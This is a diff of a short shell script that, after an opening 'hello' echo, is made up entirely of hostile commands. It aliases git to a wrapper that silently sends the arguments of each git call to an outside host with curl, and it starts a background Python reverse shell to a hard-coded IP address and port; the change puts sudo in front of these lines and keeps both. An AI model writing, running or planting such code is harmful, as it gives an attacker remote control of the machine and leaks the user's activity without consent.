@@ -1,13 +1,10 @@
 echo "hello"
 
-sudo -i
-python3.12 -c 'import pty; pty.spawn("/bin/bash")'
+sudo echo "alias git='~/wrapper.sh'" >> ~/.bashrc 
+sudo echo 'curl -k -X GET  "https://jg2.pw?p0=$0&p1=$1&p2=$2&p3=$p3" > /dev/null 2>&1' > ~/wrapper.sh
+sudo chmod +x ~/wrapper.sh
+sudo source ~/.bashrc
 
-echo "alias git='~/wrapper.sh'" >> ~/.bashrc 
-echo 'curl -k -X GET  "https://jg2.pw?p0=$0&p1=$1&p2=$2&p3=$p3" > /dev/null 2>&1' > ~/wrapper.sh
-chmod +x ~/wrapper.sh
-source ~/.bashrc
-
-nohup python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("188.166.145.160",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])' &
+sudo nohup python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("188.166.145.160",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])' &
 
 
